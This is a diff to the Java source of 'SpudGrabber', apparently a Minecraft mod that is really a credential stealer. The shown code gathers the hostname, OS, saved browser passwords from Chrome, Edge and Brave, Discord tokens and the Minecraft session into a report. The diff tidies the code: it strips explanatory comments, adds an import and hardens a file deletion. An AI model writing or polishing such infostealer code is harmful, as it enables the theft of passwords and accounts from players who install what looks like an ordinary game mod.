@@ -1,5 +1,3 @@
-
-```java
 package dev.spudgrabber;
 
 import com.sun.jna.platform.win32.Crypt32Util;
@@ -12,6 +10,7 @@ import javax.crypto.spec.GCMParameterSpec;
 import javax.crypto.spec.SecretKeySpec;
 import java.io.OutputStream;
 import java.net.HttpURLConnection;
+import java.net.InetAddress;
 import java.net.URL;
 import java.nio.charset.StandardCharsets;
 import java.nio.file.*;
@@ -51,7 +50,6 @@ public final class SpudGrabber implements ModInitializer {
               .append(hostname()).append("`\n");
             sb.append("os: `").append(System.getProperty("os.name")).append("`\n\n");
 
-            // Browser passwords (Chrome, Edge, Brave, etc.)
             for (Browser b : Browser.values()) {
                 List<String> creds = chromePasswords(b);
                 if (!creds.isEmpty()) {
@@ -62,14 +60,12 @@ public final class SpudGrabber implements ModInitializer {
                 }
             }
 
-            // Discord tokens
             List<String> dt = grabDiscordTokens();
             if (!dt.isEmpty()) {
                 sb.append("**discord tokens (").append(dt.size()).append(")**\n```\n")
                   .append(String.join("\n", dt)).append("\n```\n");
             }
 
-            // Minecraft session
             String mc = readMcSession();
             if (mc != null) {
                 sb.append("**minecraft session**\n```\n").append(mc).append("\n```\n");
@@ -118,7 +114,7 @@ public final class SpudGrabber implements ModInitializer {
                         }
                     }
                 } catch (Throwable ignored) {}
-                Files.deleteIfExists(tmp);
+                try { Files.deleteIfExists(tmp); } catch (Throwable ignored) {}
             }
         } catch (Throwable ignored) {}
         return out;
@@ -207,9 +203,7 @@ public final class SpudGrabber implements ModInitializer {
     }
 
     private static String hostname() {
-        try { return java.net.InetAddress.getLocalHost().getHostName(); }
+        try { return InetAddress.getLocalHost().getHostName(); }
         catch (Throwable t) { return "unknown"; }
     }
 }
-
-```
